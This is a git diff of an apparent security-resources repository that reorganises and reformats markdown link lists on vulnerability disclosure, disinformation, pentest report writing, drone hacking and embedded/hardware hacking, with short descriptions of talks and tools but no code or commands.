+* [Microsoft Security Advisory 2871997](https://technet.microsoft.com/library/security/2871997)
+* [Microsoft Security Advisory: Update to improve credentials protection and management: May 13, 2014](https://support.microsoft.com/en-us/help/2871997/microsoft-security-advisory-update-to-improve-credentials-protection-a)
+* [Windows Defender Device Guard deployment guide - docs ms](https://docs.microsoft.com/en-us/windows/device-security/device-guard/device-guard-deployment-guide)
+
+### Active Directory
+
+### Baselining
+
+* [Measure Boot Performance with the Windows Assessment and Deployment Toolkit](https://blogs.technet.microsoft.com/mspfe/2012/09/19/measure-boot-performance-with-the-windows-assessment-and-deployment-toolkit/)
+
+* [Evaluate Fast Startup Using the Assessment Toolkit](https://docs.microsoft.com/en-us/windows-hardware/test/wpt/optimizing-performance-and-responsiveness-exercise-1)
+
+### OS X
+
+* [netman](https://github.com/iadgov/netman)
+
+  * A userland network manager with monitoring and limiting capabilities for
+    macOS.
+
+* [netfil](https://github.com/iadgov/netfil)
+
+  * A kernel network manager with monitoring and limiting capabilities for
+    macOS.
diff --git a/Draft/Disclosure.md b/source/Disclosure.md
old mode 100755
new mode 100644
similarity index 77%
rename from Draft/Disclosure.md
rename to source/Disclosure.md
index 11ff346..a2a4c61
--- a/Draft/Disclosure.md
+++ b/source/Disclosure.md
@@ -1,8 +1,7 @@
 # Disclosure
- 
 
------
 ### General
+
 * [Responsible Disclosure is Wrong](https://adamcaudill.com/2015/11/19/responsible-disclosure-is-wrong/)
 * [Portcullis Computer Security Co-ordinated Disclosure Toolkit](https://github.com/portcullislabs/co-ordinated-disclosure-toolkit)
 * [How to Disclose or Sell an Exploit - DEF CON 21 - James Denaro](https://www.youtube.com/watch?v=N1Xj3f4felg)
@@ -10,43 +9,22 @@
 * [Good comparison of various forms of disclosure](http://blog.opensecurityresearch.com/2014/06/approaches-to-vulnerability-disclosure.html)
 * [Clean writeup of Full-Disclosure release policy that is more similar to Coordinated Disclosure.](http://www.ilias.de/docu/goto_docu_wiki_1357_RFPolicy.html)
 
--------
-### CVE 
+### CVE
+
 * [Request a CVE ID](http://cve.mitre.org/cve/request_id.html#cna_coverage)
 * [My first CVE-2016-1000329 in BlogPHP](https://www.stevencampbell.info/2016/12/my-first-cve-2016-1000329-in-blogphp/)
 
------
 ### Dealing with the press/journalists:
-* [Hacking the media for fame/profit talk](http://www.irongeek.com/i.php?page=videos/derbycon4/Hacking-The-Media-For-Fame-And-Profit-Jenn-Ellis-Steven-Reganh)
-
 
+* [Hacking the media for fame/profit talk](http://www.irongeek.com/i.php?page=videos/derbycon4/Hacking-The-Media-For-Fame-And-Profit-Jenn-Ellis-Steven-Reganh)
 
------
 ### Tools
-* [Cryptoshot](https://github.com/DiabloHorn/cryptoshot) 
-* This application will make a screenshot of the desktop. If the desktop consists of multiple monitors
-it should still work fine. However it has only been tested with a dual monitor setup. 
-The windows project has the added functionality of sending the screenshot to a server of your choosing.
-* [Record terminal sessions and have the ability to replay it](http://linux.byexamples.com/archives/279/record-the-terminal-session-and-replay-later/)
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
+* [Cryptoshot](https://github.com/DiabloHorn/cryptoshot)
 
+  * This application will make a screenshot of the desktop. If the desktop
+    consists of multiple monitors it should still work fine. However it has only
+    been tested with a dual monitor setup. The windows project has the added
+    functionality of sending the screenshot to a server of your choosing.
 
+* [Record terminal sessions and have the ability to replay it](http://linux.byexamples.com/archives/279/record-the-terminal-session-and-replay-later/)
diff --git a/Draft/Disinformation.md b/source/Disinformation.md
old mode 100755
new mode 100644
similarity index 72%
rename from Draft/Disinformation.md
rename to source/Disinformation.md
index 5a005ee..ce01ea0
--- a/Draft/Disinformation.md
+++ b/source/Disinformation.md
@@ -1,25 +1,25 @@
 ## Disinformation
 
-
 ##### Cull
-https://web.archive.org/web/20150921054800id_/http://fair.org/home/down-the-memory-hole-nyt-erases-cias-efforts-to-overthrow-syrias-government/
 
-https://meduza.io/en/feature/2015/02/02/a-man-who-s-seen-society-s-black-underbelly
-###### End cull
+* [Down the Memory Hole: NYT Erases CIA’s Efforts to Overthrow Syria’s Government](https://web.archive.org/web/20150921054800id_/http://fair.org/home/down-the-memory-hole-nyt-erases-cias-efforts-to-overthrow-syrias-government/)
+
+* [A man who’s seen society's black underbelly](https://meduza.io/en/feature/2015/02/02/a-man-who-s-seen-society-s-black-underbelly)
+
+### Talks
 
------
-### <a name="talks">
-General
 * [25 Rules of Disinformation](http://vigilantcitizen.com/latestnews/the-25-rules-of-disinformation/)
 * [8 Traits of the Disinformationalist](https://calloutjoe.wordpress.com/psyop/eight-traits-of-the-disinformationalist/)
 * [Governments and UFOs: A Historical Analysis of Disinformation and Deception - Richard Thieme](http://www.irongeek.com/i.php?page=videos/bsideslasvegas2013/1-2-7-governments-and-ufos-a-historical-analysis-of-disinformation-and-deception-richard-thieme)
 * [[TROOPERS15] Azhar Desai, Marco Slaviero - Weapons of Mass Distraction](https://www.youtube.com/watch?v=jdaPJLJCK1M)
-* [The Gentleperson?s Guide to Forum Spies]cryptome.org/2012/07/gent-forum-spies.htm)
+* [The Gentlepersons Guide to Forum Spies](cryptome.org/2012/07/gent-forum-spies.htm)
 * [Attribution As A Weapon & Marketing Tool: Hubris In INFOSEC & NATSEC](https://krypt3ia.wordpress.com/2014/12/30/attribution-as-a-weapon-marketing-tool-hubris-in-infosec-natsec/)
 * [Disinformation of Charlie Hebdo and The Fake BBC Website](http://thetrendythings.com/read/18256)
 * [Counterintelligence, False Flags, Disinformation, and Network Defense - krypt3ia](https://krypt3ia.wordpress.com/2012/10/17/counterintelligence-false-flags-disinformation-and-network-defense/)
 * [PsyOps and Socialbots](http://resources.infosecinstitute.com/psyops-and-socialbots/)
 * [A Digital World Full of Ghost Armies](http://www.cigtr.info/2015/02/a-digital-world-full-of-ghost-armies.html)
-	* Not very related to infosec per say, but the general idea/takeaway is very applicable.
-* [Russia Convention on International Information Security](http://cryptome.org/2014/05/ru-international-infosec.htm)
 
+  * Not very related to infosec per say, but the general idea/takeaway is very
+    applicable.
+
+* [Russia Convention on International Information Security](http://cryptome.org/2014/05/ru-international-infosec.htm)
diff --git a/Draft/Documentation & Reports -.md b/source/Documentation-Reports.md
old mode 100755
new mode 100644
similarity index 61%
rename from Draft/Documentation & Reports -.md
rename to source/Documentation-Reports.md
index 1a768af..9795899
--- a/Draft/Documentation & Reports -.md	
+++ b/source/Documentation-Reports.md
@@ -1,60 +1,55 @@
-## Documentation & Reporting
-
-#### For writing technical documentation.
-
+## Documentation & Reporting - For writing technical documentation.
 
 ##### TOC
+
 * [Writing](#writing)
 * [Reports](#reports)
 * [Collaboration Tools](#collab)
 * [Meta](#meta)
 * [Video Documentation](#video)
 
-
------
 ### General/Disclosure
+
 * [NCSAM: Coordinated Vulnerability Disclosure Advice for Researchers](https://community.rapid7.com/community/infosec/blog/2016/10/28/ncsam-coordinated-vulnerability-disclosure-advice-for-researchers)
 * [Protecting Your Sources When Releasing Sensitive Documents](https://source.opennews.org/articles/how-protect-your-sources-when-releasing-sensitive-/)
 
+### Writing
 
+Start with the first two links, and go from there. Theyre both great resources
+to writing technical documentation, the first being a beginners guide and the
+second being a general guide that beginners can understand.
 
-
-
------
-### <a name="writing">Writing</a>
-
-Start with the first two links, and go from there. They?re both great resources to writing technical documentation, the first being a beginners guide and the second being a general guide that beginners can understand.
 * [A beginners guide to writing documentation](http://docs.writethedocs.org/writing/beginners-guide-to-docs/)
-* [Teach, Don?t Tell](http://stevelosh.com/blog/2013/09/teach-dont-tell/)
+* [Teach, Dont Tell](http://stevelosh.com/blog/2013/09/teach-dont-tell/)
 * [How to Write Papers So People Can Read Them - Derek Dreyer](https://www.youtube.com/watch?v=L_6xoMjFr70)
 
 Other Materials:
- * Three parter from jacobian.org:
-	* [What to write](http://jacobian.org/writing/what-to-write/)
-	* [Technical Style](http://jacobian.org/writing/technical-style/)
-	* [Editors](http://jacobian.org/writing/editors/)
-* [Writing Types of User Documentation](https://en.wikiversity.org/wiki/Technical_writing_Types_of_User_Documentation0
+
+* Three parts from jacobian.org:
+  * [What to write](http://jacobian.org/writing/what-to-write/)
+  * [Technical Style](http://jacobian.org/writing/technical-style/)
+  * [Editors](http://jacobian.org/writing/editors/)
+* [Writing Types of User Documentation](https://en.wikiversity.org/wiki/Technical_writing_Types_of_User_Documentation)
 * [How to write a great research paper - Simon Peyton Jones](https://www.microsoft.com/en-us/research/academic-program/write-great-research-paper/)
 * [The 7 Rules for Writing World Class Technical Documentation](http://www.developer.com/tech/article.php/3848981/The-7-Rules-for-Writing-World-Class-Technical-Documentation.htm)
 * [Teach Technical Writing in Two Hours per Week](http://www.cs.tufts.edu/~nr/pubs/two-abstract.html)
 * [Learn Technical Writing in Two Hours per Week - Norman Ramsey](http://www.cs.tufts.edu/~nr/pubs/learn-two.pdf)
 * [Politics and the English Language - George Orwell](http://www.npr.org/blogs/ombudsman/Politics_and_the_English_Language-1.pdf)
 
+### Writing Reports
 
+* [Public penetration testing reports](https://github.com/juliocesarfort/public-pentesting-reports)
 
+  * Curated list of public penetration test reports released by several
+    consulting firms and academic security groups
 
-
------
-### <a name="reports">Writing Reports</a>
-* [Public penetration testing reports](https://github.com/juliocesarfort/public-pentesting-reports)
-	* Curated list of public penetration test reports released by several consulting firms and academic security groups
-* [Penetration tests done by cure53, good examples of how a report should be done.](https://cure53.de/#publications )
+* [Penetration tests done by cure53, good examples of how a report should be done.](https://cure53.de/#publications)
 * [Writing a Penetration Testing Report by SANS](https://www.sans.org/reading-room/whitepapers/bestprac/writing-penetration-testing-report-33343)
 * [Excellent blog post breaking down the various parts, a must read](http://wwwwebsecuritywatch.com/the-penetration-testing-report/)
 * [Report Template from vulnerabilityassessment.co.uk](http://www.vulnerabilityassessment.co.uk/report%20template.html)
 * [Penetration Testing Execution Standard section on Reporting](http://www.pentest-standard.org/index.php/Reporting)
 * [Tips for Creating an Information Security Assessment Report Cheat Sheet](https://zeltser.com/security-assessment-report-cheat-sheet/)
-[SANS InfoSec Policy Templates](https://www.sans.org/security-resources/policies/)
+* [SANS InfoSec Policy Templates](https://www.sans.org/security-resources/policies/)
 * [HowTo: Write pentest reports the easy way](http://blog.dornea.nu/2014/05/20/howto-write-pentest-reports-the-easy-way/)
 * [Offensive Security 2013 Demo report](http://www.offensive-security.com/offsec/penetration-test-report-2013/)
 * [security-assessment-rfp-cheat-sheet](http://zeltser.com/security-assessments/security-assessment-rfp-cheat-sheet.html)
@@ -63,43 +58,59 @@ Other Materials:
 * [Teach Technical Writing in Two Hours per Week](http://www.cs.tufts.edu/~nr/pubs/two-abstract.html)
 * [Learn Technical Writing in Two Hours per Week - Norman Ramsey](http://www.cs.tufts.edu/~nr/pubs/learn-two.pdf)
 
+### Meta
 
------
-### <a name="meta">Meta</a>
 * [What is Markdown?](http://daringfireball.net/projects/markdown/syntax)
 * [Using markdown](https://guides.github.com/features/mastering-markdown/)
 * [Markdown Syntax](http://daringfireball.net/projects/markdown/syntax)
 * [Markdown basics](https://help.github.com/articles/markdown-basics/)
 * [Mastering Markdown](https://guides.github.com/features/mastering-markdown/)
 * [vim-wordy](https://github.com/reedes/vim-wordy/blob/master/README.markdown)
-	* wordy is not a grammar checker. Nor is it a guide to proper word usage. Rather, wordy is a lightweight tool to assist you in identifying those words and phrases known for their history of misuse, abuse, and overuse, at least according to usage experts.
 
+  * wordy is not a grammar checker. Nor is it a guide to proper word usage.
+    Rather, wordy is a lightweight tool to assist you in identifying those words
+    and phrases known for their history of misuse, abuse, and overuse, at least
+    according to usage experts.
+
+### Penetration Testing / Collaboration Tools
 
------
-### <a name="collab">Penetration Testing / Collaboration Tools</a>
 * [Kvasir](https://github.com/KvasirSecurity/Kvasir)
-	* Kvasir is a vulnerability / penetration testing data management system designed to help mitigate the issues found when performing team-based assessments. Kvasir does this by homogenizing data sources into a pre-defined structure. Currently the following sources are supported:
+
+  * Kvasir is a vulnerability / penetration testing data management system
+    designed to help mitigate the issues found when performing team-based
+    assessments. Kvasir does this by homogenizing data sources into a
+    pre-defined structure. Currently the following sources are supported:
+
 * [Dradis](https://github.com/dradis/dradisframework#welcome-to-dradis)
-	* Dradis is an open source collaboration framework, tailored to InfoSec teams.
-	* It can integrate with a lot of existing tools you probably are using if you're reading this.
+
+  * Dradis is an open source collaboration framework, tailored to InfoSec teams.
+  * It can integrate with a lot of existing tools you probably are using if
+    you're reading this.
+
 * [Faraday](https://github.com/infobyte/faraday)
-	* Faraday introduces a new concept (IPE) Integrated Penetration-Test Environment a multiuser Penetration test IDE. Designed for distribution, indexation and analysis of the generated data during the process of a security audit.  The main purpose of Faraday is to re-use the available tools in the community to take advantage of them in a multiuser way.
+
+  * Faraday introduces a new concept (IPE) Integrated Penetration-Test
+    Environment a multiuser Penetration test IDE. Designed for distribution,
+    indexation and analysis of the generated data during the process of a
+    security audit. The main purpose of Faraday is to re-use the available tools
+    in the community to take advantage of them in a multiuser way.
+
 * [Lair](https://github.com/lair-framework/lair)
-	* Lair is a reactive attack collaboration framework and web application built with meteor. 
-* [CrScreenshotDxe](https://github.com/NikolajSchlej/CrScreenshotDxe)
-	* UEFI DXE driver to take screenshots from GOP-compatible graphic console
 
+  * Lair is a reactive attack collaboration framework and web application built
+    with meteor.
+
+* [CrScreenshotDxe](https://github.com/NikolajSchlej/CrScreenshotDxe)
 
+  * UEFI DXE driver to take screenshots from GOP-compatible graphic console
 
+### Video Recording
 
------
-### <a name="video">Video Recording</a>
 * [Open Broadcaster Software OBS](https://obsproject.com/)
-	* Open Broadcaster Software is free and open source software for video recording and live streaming.
-	* Cross Platform, Windows/OsX/Linux
 
------
-### <a name="reading">Reading Papers</a>
-* [How I read a research paper](https://muratbuffalo.blogspot.com/2013/07/how-i-read-research-paper.html?m=1)
+  * Open Broadcaster Software is free and open source software for video
+    recording and live streaming. Cross Platform, Windows/OSX/Linux
 
+### Reading Papers
 
+* [How I read a research paper](https://muratbuffalo.blogspot.com/2013/07/how-i-read-research-paper.html?m=1)
diff --git a/source/Drones.md b/source/Drones.md
new file mode 100644
index 0000000..b7014d9
--- /dev/null
+++ b/source/Drones.md
@@ -0,0 +1,15 @@
+## Drone Hacking
+
+### General
+
+* [ArduPilot](http://ardupilot.org/ardupilot/index.html)
+
+* [Knocking my neighbors kids cruddy drone offline - DefCon 23 Robinson and Mitchell](https://www.youtube.com/watch?v=5CzURm7OpAA)
+
+* [Game of Drones - Brown,Latimer - Defcon25](https://www.youtube.com/watch?v=iG7hUE2BZZo)
+
+  * We’ve taken a MythBusters-style approach to testing the effectiveness of a
+    variety of drone defense solutions, pitting them against our DangerDrone.
+    Videos demonstrating the results should be almost as fun for you to watch as
+    they were for us to produce. Expect to witness epic aerial battles against
+    an assortment of drone defense types
diff --git a/source/Embedded-Device-Hardware-Hacking.md b/source/Embedded-Device-Hardware-Hacking.md
new file mode 100644
index 0000000..a5eaeba
--- /dev/null
+++ b/source/Embedded-Device-Hardware-Hacking.md
@@ -0,0 +1,578 @@
+##Embedded Device Security
+
+* [Embedded Systems - Wikipedia](https://en.wikipedia.org/wiki/Embedded_system)
+
+##### ToC
+
+* [General](#general)
+* [General Hardware Hacking](#generalhw)
+* [General Hardware Articles/Writeups](#generalwriteups)
+* [General Hardware Hacking Talks/Presentations](#generaltalks)
+* [General Hardware Hacking Tools](#generaltools)
+* [Attacking Routers](#routers)
+* [Cable Modem Hacking](#modem)
+* [Educational/Information on things you wouldn't find in a Dictionary](#education)
+* [Flash Memory](#flash)
+* [Internet of Things](#iot)
+* [General Tools(S/W & H/W)](#gentools)
+* [Miscellaneous](#misc)
+* [PCI](#PCI)
+* [Printers](#printers)
+* [USB](#USB)
+* [PenTest Dropboxes](#dropbox)
+* [Teensy/Rubberducky Style Attack Tools](#teensy)
+* [SD Cards](#sdcard)
+* [Tutorials/Walkthroughs/Write-ups](#writeups)
+* [USB](#usb)
+* [SmartCards](#smartcard)
+* [Papers](#papers)
+
+#### To Sort
+
+* [Smart TV Security - #1984 in 21 st century](https://cansecwest.com/slides/2013/SmartTV%20Security.pdf)
+
+  * This talk is more about security bugs and rootkits than about firmware for
+    TVs. This talk more covers rootkits than security bugs and exploitation
+    thereof, as theyre not different to traditional techniques. This talk is
+    about general security issues of all Smart TV vendors.
+
+* http://www.sp3ctr3.me/hardware-security-resources/
+
+* http://greatscottgadgets.com/infiltrate2013/
+
+* [SPI](https://trmm.net/SPI_flash)
+
+* [umap](https://github.com/nccgroup/umap)
+
+  * The USB host security assessment tool
+
+* [Pwn2Win 2017 - Shift Register](http://blog.dragonsector.pl/2017/10/pwn2win-2017-shift-register.html)
+
+* [From Zero to ZeroDay Journey: Router Hacking (WRT54GL Linksys Case)](http://www.defensecode.com/whitepapers/From_Zero_To_ZeroDay_Network_Devices_Exploitation.txt)
+* [Ghosts from the Past: Authentication bypass and OEM backdoors in WiMAX routers](http://blog.sec-consult.com/2017/06/ghosts-from-past-authentication-bypass.html)
+* [Apple Lightning Reverse Engineered](http://ramtin-amin.fr/#tristar)
+* [Reverse Engineering Intels Management Engine](http://recon.cx/2014/slides/Recon%202014%20Skochinsky.pdf)
+
+  * On every intel chip core2duo and newer
+
+* [ChipWhisperer](http://www.newae.com/chipwhisperer)
+
+  * ChipWhisperer is the first ever open-source solution that provides a
+    complete toolchain for research and analysis of embedded hardware security.
+    Side Channel Power Analysis, Clock Glitching, VCC Glitching, and more are
+    all possible with this unique tool.
+
+* Hacking the Dropcam series
+
+  * [Part 1 - Dropcam Comms](http://blog.includesecurity.com/2014/03/Reverse-Engineering-Dropcam-Communications.html)
+  * [Part 2 - Rooting the Dropcam](http://blog.includesecurity.com/2014/04/reverse-engineering-dropcam-rooting-the-device.html)
+  * [Part 3 - Dropcam Lua Bytecode](http://blog.includesecurity.com/2014/08/Reverse-Engineering-Dropcam-Lua-Bytecode.html)
+
+* [Hardware reverse engineering tools (Olivier Thomas) - REcon 2013](https://www.youtube.com/watch?v=o77GTR8RovM)
+
+* [Reverse Engineering: Reverse Engineering Flash Memory for Fun and Benefit - BlackHat 2014](https://www.youtube.com/watch?v=E8BSnS4-Kpw)
+
+### General
+
+* [Reversing and Exploiting Embedded Devices: The Software Stack (Part 1)](https://p16.praetorian.com/blog/reversing-and-exploiting-embedded-devices-part-1-the-software-stack)
+* [Hardware Security and Trust/ECE 4451/5451: Introduction to Hardware Security and Trust](https://www.engr.uconn.edu/~tehrani/teaching/hst/)
+* [NSA Playset](http://www.nsaplayset.org/)
+
+  * In the coming months and beyond, we will release a series of dead simple,
+    easy to use tools to enable the next generation of security researchers. We,
+    the security community have learned a lot in the past couple decades, yet
+    the general public is still ill equipped to deal with real threats that face
+    them every day, and ill informed as to what is possible. Inspired by the NSA
+    ANT catalog, we hope the NSA Playset will make cutting edge security tools
+    more accessible, easier to understand, and harder to forget. Now you can
+    play along with the NSA!
+
+* [Anti-Evil Maid](http://theinvisiblethings.blogspot.com/2011/09/anti-evil-maid.html?m=1)
+* [Breaking IPMI/BMC](http://fish2.com/ipmi/how-to-break-stuff.html)
+
+### General Writeups/Articles
+
+* [Door Control Systems: An Examination of Lines of Attack](https://www.nccgroup.com/en/blog/2013/09/door-control-systems-an-examination-of-lines-of-attack/)
+* [Smart Parking Meters](http://uninformed.org/?v=all&a=6&t=sumry)
+
+  * Security through obscurity is unfortunately much more common than people
+    think: many interfaces are built on the premise that since they are a
+    "closed system" they can ignore standard security practices. This paper will
+    demonstrate how parking meter smart cards implement their protocol and will
+    point out some weaknesses in their design that open the doors to the system.
+    It will also present schematics and code that you can use to perform these
+    basic techniques for auditing almost any type of blackblox secure memory
+    card.
+
+* [Attacks via physical access to USB (DMA?)](https://security.stackexchange.com/questions/118854/attacks-via-physical-access-to-usb-dma)
+* [Can a connected USB device read all data from the USB bus?](https://security.stackexchange.com/questions/37927/can-a-connected-usb-device-read-all-data-from-the-usb-bus?rq=1)
+* [Introduction to Glitch Attacks](<https://wiki.newae.com/Tutorial_A2_Introduction_to_Glitch_Attacks_(including_Glitch_Explorer)>)
+
+  * This advanced tutorial will demonstrate clock glitch attacks using the
+    ChipWhisperer system. This will introduce you to many required features of
+    the ChipWhisperer system when it comes to glitching. This will be built on
+    in later tutorials to generate voltage glitching attacks, or when you wish
+    to attack other targets.
+
+* [Hacking Voting Machines at DEF CON 25](https://blog.horner.tj/post/hacking-voting-machines-def-con-25)
+* [dc25-votingvillage-report - notes from participants](https://github.com/josephlhall/dc25-votingvillage-report/blob/master/notes-from-folks-redact.md)
+* [dc25-votingvillage-report](https://github.com/josephlhall/dc25-votingvillage-report)
+
+  * A report to synthesize findings from the Defcon 25 Voting Machine Hacking
+    Village
+
+* [Secure Tokin & Doobiekeys: How to roll your own counterfeit hardware security devices - @securelyfitz, @r00tkillah](https://media.defcon.org/DEF%20CON%2025/DEF%20CON%2025%20presentations/DEFCON-25-r00killah-and-securelyfitz-Secure-Tokin-and-Doobiekeys.pdf)
+* [Inside a low budget consumer hardware espionage implant](https://ha.cking.ch/s8_data_line_locator/)
+
+### General Talks/Presentations
+
+* [Jackson Thuraisamy & Jason Tran - Hacking POS PoS Systems](https://www.youtube.com/watch?v=-n7oJqmTUCo)
+* [Hardware Hacking the Easyware Way](http://www.irongeek.com/i.php?page=videos/derbycon6/417-hardware-hacking-the-easyware-way-brian-fehrman)
+
+  * Interested in hardware hacking but not quite sure where to start? Does the
+    thought of soldering thrill you (or scare you)? Come check out this talk to
+    see just how easy it is to jump into this exciting field of research! Many
+    people and companies use similar models of hardware. Unlike software, these
+    devices rarely receive security updates. Sometimes, used devices are sold
+    without clearing the configurations and important data is left behind. After
+    this talk, you will know how to find hidden interfaces on these devices,
+    start searching for vulnerabilities and sensitive information, and have
+    irresistible urges to go home and tear apart all your old networking
+    equipment. Did we mention...live demo?
+
+* [Deconstructing the Circuit Board Sandwich DEF CON 22 - Joe Grand aka Kingpin](https://www.youtube.com/watch?v=O8FQZIPkgZM)
+* [Multiplexed Wired Attack Surfaces - Michael Ossmann & Kos - Toorcon15](https://www.youtube.com/watch?v=4QB79921Nlw)
+
+  * Manufacturers of mobile devices often multiplex several wired interfaces
+    onto a single connector. Some of these interfaces, probably intended for
+    test and development, are still enabled when the devices ship. We'll show
+    you how you can get a shell on a popular mobile phone via its USB port
+    without using a USB connection and we will release an open source tool for
+    exploring multiplexed wired interfaces.
+
+* [SATELLITE TV RECEIVERS: FROM REMOTE CONTROL TO ROOT SHELL - Sofiane Talmat](https://vimeo.com/album/3682874/video/148910624)
+* [NSA USB Playset - ShmooCon201](https://www.youtube.com/watch?v=eTDBFpLYcGA)
+* [Chip & PIN is Definitely Broken - Defcon 19](https://www.youtube.com/watch?v=JABJlvrZWbY)
+* [Ian Douglas - Creating an Internet of Private Things](https://www.youtube.com/watch?v=4W8SkujOXi4&list=PLuUtcRxSUZUpv2An-RNhjuZSJ5fjY7ghe&index=8)
+
+  * The next big market push is to have the cool IoT device thats connected to
+    the internet. As weve seen from the Mirai and Switcher hacks, its important
+    to embed the appropriate safeguards so that devices are not open to attack.
+    When selecting device components there are things that should be checked
+    for, and when youre doing the coding and workflows, there are other things
+    that need to be taken in to account. Although security and privacy are close
+    cousins, theyre also different. This talk will be centered around some best
+    security and privacy practices as well as some common errors that should be
+    avoided.
+
+* [Rooting the MikroTik routers (SHA2017)](https://www.youtube.com/watch?v=KZWGD9fWIcM)
+
+  * In this talk I describe my journey into reverse engineering parts of
+    MikroTik system to gain access to hardware features and the shell behind the
+    RouterOS that has no ls.
+
+* [When IoT Attacks: Hacking A Linux-Powered Rifle ](https://www.blackhat.com/docs/us-15/materials/us-15-Sandvik-When-IoT-Attacks-Hacking-A-Linux-Powered-Rifle.pdf)
+
+### General Tools
+
+* [ThunderGate](http://thundergate.io/)
+
+  * ThunderGate is a collection of tools for the manipulation of Tigon3 Gigabit
+    Ethernet controllers, with special emphasis on the Broadcom NetLink 57762,
+    such as is found in Apple Thunderbolt Gigabit Ethernet adapters.
+
+* [Metasploit Hardware Brdige](https://community.rapid7.com/community/transpo-security/blog/2017/02/02/exiting-the-matrix) \*
+  * [Hardware Bridge API](http://opengarages.org/hwbridge/)
+* [ChipWhisperer](http://www.newae.com/chipwhisperer)
+
+  * ChipWhisperer is the first ever open-source solution that provides a
+    complete toolchain for research and analysis of embedded hardware security.
+    Side Channel Power Analysis, Clock Glitching, VCC Glitching, and more are
+    all possible with this unique tool.
+
+### Attacking Routers
+
+* [More on HNAP - What is it, How to Use it, How to Find it](https://isc.sans.edu/diary/More+on+HNAP+-+What+is+it%2C+How+to+Use+it%2C+How+to+Find+it/17648)
+* [Router Post-Exploitation Framework](https://github.com/mncoppola/rpef)
+
+  * Abstracts and expedites the process of backdooring stock firmware images for
+    consumer/SOHO routers.
+
+* [ASUS Router infosvr UDP Broadcast root Command Execution](https://github.com/jduck/asus-cmd)
+* [Unpacking Firmware images from cable modems](http://w00tsec.blogspot.com.br/2013/11/unpacking-firmware-images-from-cable.html)
+* [From 0-day to exploit Buffer overflow in Belkin N750 (CVE-2014-1635)](https://labs.integrity.pt/articles/from-0-day-to-exploit-buffer-overflow-in-belkin-n750-cve-2014-1635/)
+* [Hacking the D-Link DIR-890L](http://www.devttys0.com/2015/04/hacking-the-d-link-dir-890l/)
+* [Multiple Vulnerabilities in BHU WiFi uRouter](http://blog.ioactive.com/2016/08/multiple-vulnerabilities-in-bhu-wifi.html)
+
+### TR-069
+
+* [I Hunt TR-069 Admins - Pwning ISPs Like a Boss - Defcon 22](https://media.defcon.org/DEF%20CON%2022/DEF%20CON%2022%20video%20and%20slides/DEF%20CON%2022%20Hacking%20Conference%20Presentation%20By%20Shahar%20Tal%20-%20I%20Hunt%20TR%20-%20069%20Admins%20-%20Pwning%20ISPs%20Like%20a%20Boss%20-%20Video%20and%20Slides.m4v)
+* [Related to TR-069](http://blog.3slabs.com/2012/12/a-brief-survey-of-cwmp-security.html)
+
+### Cable Modem Hacking
+
+[Docsis hacking](https://www.defcon.org/images/defcon-16/dc16-presentations/defcon-16-self.pdf)
+[Hacking Docsis for fun and profit](https://www.defcon.org/images/defcon-18/dc-18-presentations/Blake-bitemytaco/DEFCON-18-Blake-bitemytaco-Hacking-DOCSIS.pdf)
+
+[Keykeriki v2.0](http://www.remote-exploit.org/articles/keykeriki_v2_0__8211_2_4ghz/index.html)
+
+* Hardware to attack wireless keyboards and other such things
+
+### Educational
+
+* [Hardware Hacking for Software People](http://dontstuffbeansupyournose.com/2011/08/25/hardware-hacking-for-software-people/)
+* [Glitching for n00bs - A journey to coax out chips' inner seccrets](http://media.ccc.de/browse/congress/2014/31c3_-_6499_-_en_-_saal_2_-_201412271715_-_glitching_for_n00bs_-_exide.html#video)
+
+  * Despite claims of its obsolescence, electrical glitching can be a viable
+    attack vector against some ICs. This presentation chronicles a quest to
+    learn what types of electrical transients can be introduced into an
+    integrated circuit to cause a variety of circuit faults advantageous to an
+    reverser. Several hardware platforms were constructed during the quest to
+    aid in research, including old-skool & solderless breadboards, photo-etched
+    & professional PCBs, FPGAs, and cheap & dirty homemade logic analyzers. The
+    strengths and weaknesses of the various approaches will be discussed.
+
+* [Hardware Hacking Videos](http://vimeo.com/album/1632121)
+* [Serial Peripheral Interface Bus](https://en.wikipedia.org/wiki/Serial_Peripheral_Interface_Bus)
+* [I2C - Inter-Integrated Circuit](https://en.wikipedia.org/wiki/I%C2%B2C)
+* [Display Data Channel](https://en.wikipedia.org/wiki/Display_Data_Channel)
+* [UART - Universal asynchronous receiver/transmitter](https://en.wikipedia.org/wiki/Universal_asynchronous_receiver/transmitter)
+* [Hardware Hacking - Nicolas Collins](http://www.nicolascollins.com/texts/originalhackingmanual.pdf)
+* [Common methods of H/W hacking](https://www.sparkfun.com/news/1314)
+* [Modbus Protocol Overview](https://www.lammertbies.nl/comm/info/modbus.html)
+* [ISO/IEC 7816](https://en.wikipedia.org/wiki/ISO/IEC_7816)
+* [ISO/IEC 15693](https://en.wikipedia.org/wiki/ISO/IEC_15693)
+* [ISO/IEC 14443](https://en.wikipedia.org/wiki/ISO/IEC_14443)
+
+### Flash Memory
+
+* [Reverse Engineering Flash Memory for Fun and Benefit - BlackHat 2014](https://www.youtube.com/watch?v=E8BSnS4-Kpw)
+* [Vulnerabilities in MLC NAND Flash Memory Programming: Experimental Analysis, Exploits, and Mitigation Techniques](https://pdfs.semanticscholar.org/b9bc/a3c9f531002854af48de121cdcc8e0520c7f.pdf)
+
+### Internet of Things
+
+* [Smart Nest Thermostat A Smart Spy in Your Home](https://www.youtube.com/watch?v=UFQ9AYMee_Q)
+* [A Primer on IoT Security Research](https://community.rapid7.com/community/infosec/blog/2015/03/10/iot-security-research-whats-it-take)
+* [Security of Things: An Implementers Guide to Cyber-Security for Internet of Things Devices and Beyond - NCC Group](https://www.nccgroup.com/media/481272/2014-04-09_-_security_of_things_-_an_implementers_guide_to_cyber_security_for_internet_of_things_devices_and_beyond-2.pdf)
+
+### General Tools(Software & Hardware)
+
+* [FCC ID Lookup](http://transition.fcc.gov/oet/ea/fccid/)
+
+  * Lookup devices according to FCC ID
+
+* [Logic Pirate](http://dangerousprototypes.com/docs/Logic_Pirate)
+
+  * The Logic Pirate is an inexpensive, yet capable open source logic analyzer.
+    It is designed to support the SUMP logic analyzer protocol. Costs $30.
+    Recommended to me by those who use it.
+  * [Blog Post about it](http://dangerousprototypes.com/2014/04/15/new-prototype-logic-pirate-8-channel-256k-sample-60msps-logic-analyzer/)
+
+* [JTAGulator](http://www.grandideastudio.com/portfolio/jtagulator/)
+
+  * JTAGulator is an open source hardware tool that assists in identifying OCD
+    connections from test points, vias, or component pads on a target device.
+
+### Miscellaneous
+
+* [Project bdp](http://www.malcolmstagg.com/bdp-s390.html)
+
